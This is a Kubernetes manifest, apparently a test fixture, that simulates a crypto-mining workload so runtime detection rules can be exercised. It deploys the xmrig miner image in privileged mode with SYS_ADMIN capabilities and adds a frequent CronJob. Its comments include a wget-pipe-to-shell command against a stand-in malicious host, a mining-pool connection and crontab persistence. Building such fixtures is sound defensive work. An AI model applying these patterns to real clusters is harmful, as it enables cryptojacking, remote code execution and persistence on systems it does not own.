# Simulated Malicious Workload (Crypto Miner Pattern)
# For testing Nubicustos K8s runtime detection (Falco-style rules)
# NOTE: This is a SIMULATION for testing detection, not actual malware

apiVersion: apps/v1
kind: Deployment
metadata:
  name: suspicious-workload
  namespace: default
  labels:
    app: suspicious
spec:
  replicas: 1
  selector:
    matchLabels:
      app: suspicious
  template:
    metadata:
      labels:
        app: suspicious
    spec:
      containers:
      - name: miner-simulation
        # VULN: Suspicious image name patterns
        image: xmrig/xmrig:latest  # Known crypto miner image

        # VULN: High resource requests (typical of miners)
        resources:
          requests:
            cpu: "4"
            memory: "8Gi"
          limits:
            cpu: "8"
            memory: "16Gi"

        # VULN: Suspicious command execution
        command: ["/bin/sh"]
        args:
        - -c
        - |
          # Simulated suspicious activities for detection testing
          echo "Connecting to mining pool..."
          # VULN: Connection to known mining pools
          # curl stratum+tcp://pool.minexmr.com:4444
          # VULN: Process names that match mining patterns
          # ./xmrig -o pool.example.com:3333 -u wallet
          while true; do
            echo "Simulated high CPU activity"
            sleep 60
          done

        securityContext:
          # VULN: Capabilities for GPU access (mining)
          capabilities:
            add:
            - SYS_ADMIN
            - SYS_RAWIO
          privileged: true

---
# VULN: CronJob with suspicious scheduling (persistence)
apiVersion: batch/v1
kind: CronJob
metadata:
  name: suspicious-cronjob
  namespace: default
spec:
  # VULN: Runs very frequently
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: suspicious-job
            image: busybox:latest
            command:
            - /bin/sh
            - -c
            - |
              # VULN: Downloads and executes remote scripts
              # wget -q -O- http://malicious.com/script.sh | sh
              # VULN: Attempts to modify system files
              # echo "* * * * * /tmp/miner" >> /etc/crontab
              echo "Simulated suspicious cron activity"
          restartPolicy: OnFailure
